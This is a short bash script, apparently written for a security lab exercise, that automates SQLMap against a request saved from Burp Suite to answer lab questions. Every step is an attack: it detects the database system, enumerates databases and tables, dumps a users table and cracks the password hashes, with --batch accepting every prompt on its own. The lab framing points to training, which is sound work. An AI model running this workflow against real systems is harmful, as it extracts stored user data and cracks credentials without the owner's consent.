#!/usr/bin/env bash
# Phase 2 — SQLMap enumerate + dump (Lab questions 1–5 for Tool 1)
# Grounded in: StationX SQLMap cheat sheet (Lee, 2026).
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=config.sh
source "$HERE/config.sh"
# shellcheck source=lib/common.sh
source "$HERE/lib/common.sh"

c_blue "=== Phase 2: SQLMap against the saved Burp request ==="
[ -f "$REQUEST_FILE" ] || {
  c_red "Request file not found: $REQUEST_FILE"
  c_red "In Burp, right-click the Tool-1 request -> Copy to file / Save item, then set REQUEST_FILE in config.sh."
  exit 1
}

# Step 1: back-end DBMS + list of databases  (Q1, Q2, Q3)
run_and_capture "q1_q2_q3_dbs" "SQLMap: detect DBMS and enumerate databases" -- \
  sqlmap -r "$REQUEST_FILE" --batch --dbs

if [ -n "${DB_NAME:-}" ]; then
  # Step 2: tables in the Wilbur database
  run_and_capture "q3_tables" "SQLMap: list tables in $DB_NAME" -- \
    sqlmap -r "$REQUEST_FILE" -D "$DB_NAME" --batch --tables

  # Step 3: dump users table; --batch auto-accepts the hash-cracking prompt (Q4, Q5)
  run_and_capture "q4_q5_users_dump" "SQLMap: dump $DB_NAME.$USERS_TABLE and crack hashes" -- \
    sqlmap -r "$REQUEST_FILE" -D "$DB_NAME" -T "$USERS_TABLE" --dump --batch
else
  c_red "DB_NAME is empty. Read the DB name from output/q1_q2_q3_dbs.txt,"
  c_red "set DB_NAME in config.sh, then re-run this script for Q4/Q5."
fi
